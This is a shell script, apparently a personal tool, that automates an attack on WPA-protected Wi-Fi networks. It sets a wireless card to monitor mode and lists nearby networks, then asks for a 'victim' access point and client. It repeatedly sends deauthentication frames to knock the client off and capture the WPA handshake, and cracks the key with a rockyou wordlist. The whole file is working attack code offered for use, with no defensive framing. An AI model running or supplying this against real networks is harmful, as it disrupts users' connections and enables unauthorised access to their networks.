#!/bin/sh
#------------------------#
# Created by Arvin Itaas
# Website:
#------------------------#



# Finds name of attackers wireless interface and store in var INTERFACE
obtain_interface() {

	INTERFACE="$(iw dev | awk '$1=="Interface" {print $2}')"

	clear

	echo Now obtaining wireless interface name.
	sleep 1

	if [ -z "$INTERFACE" ];
	then
		echo No wireless interface has been detected.
		exit 0
	fi

	echo Wireless interface detected with name: $INTERFACE
	sleep 1

}

# Changes wireless interface to monitor mode
monitor_mode() {

	echo Now switching wireless interface to monitor mode...
	sleep 1

	ifconfig $INTERFACE down
	iwconfig $INTERFACE mode monitor
	ifconfig $INTERFACE up

	echo Wireless interface now in monitor mode.
	sleep 1

}

# Prompts attacker to enter BSSID and CLIENT MAC address
obtain_victim_info() {

	x-terminal-emulator -e "airodump-ng -w dumpfiles/dump $INTERFACE" &

        echo "\nNow displaying possible targets..."
        sleep 2

	read -p "Enter target BSSID: " APMAC
	sleep 1

	read -p "Enter STATION MAC address: " CLMAC
	sleep 1

	# Finds PID of airodump-ng and kills it
        TEMPPID=`ps -ef | grep "\bairodump-ng -w dumpfiles/dump $INTERFACE\b" | awk '{print $2}'`
        kill 15 $TEMPPID

}


# Obtains the specific channel which the given BSSID is on
obtain_channel() {

	echo "\nRetrieving $APMAC channel..."
	sleep 1

	# Obtains the channel of the input BSSID from the dump files of the airodump-ng above
	CH=$(awk -F "\"*, \"*" '$1=="'$APMAC'" {print $4}' dumpfiles/dump-01.csv)

        echo $APMAC found on channel: $CH
	sleep 1

}

# Attempts to retrieve WPA handshake which will be saved in crackfiles/psk.cap
wpa_handshake() {

	local HSHAKE
	local CRACKPID DUMPPID

	echo "\nAttempting to capture packets on channel $CH..."

	# Displays airodump-ng and captured packet info for user on channel $CH
	x-terminal-emulator -e "airodump-ng -w crackfiles/psk -c $CH $INTERFACE" &
	sleep 2

	echo Attempting to get WPA handshake on $APMAC...

	HSHAKE="temp"

	# Checks if WPA handshake was successfully retrieved
	while [ -n "$HSHAKE" ]
	do
		aireplay-ng -0 5 -a $APMAC -c $CLMAC $INTERFACE
	        sleep 5

		# Prints to output.txt if WPA handshake was found
		aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap > output.txt &
		sleep 1

		# Obtains PID of aircrack process above and will kill it
		CRACKPID=`ps -ef | grep "\baircrack\b" | awk '{print $2}'`
		if [ -n "$TEMPPID" ]
		then
			kill 15 $CRACKPID
		fi

		# If HSHAKE is not null, then WPA handshake was not found
		HSHAKE=$(grep "No valid WPA handshakes found" output.txt)
		if [ -n $HSHAKE ]
		then
			echo "$HSHAKE\n"
		fi

	done

	# Once WPA handshake has been found, airodump-ng is no longer needed
	DUMPPID=`ps -ef | grep "\bairodump-ng\b" | awk '{print $2}'`
	kill 15 $DUMPPID

}

# Attempts to crack WPA key using WPA handshake through public wordlists
wordlist_crack() {

	x-terminal-emulator -e "aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap"

}

#-------------------------------#
#	MAIN EXECUTION		#
#-------------------------------#

obtain_interface
monitor_mode
obtain_victim_info
obtain_channel
wpa_handshake
wordlist_crack
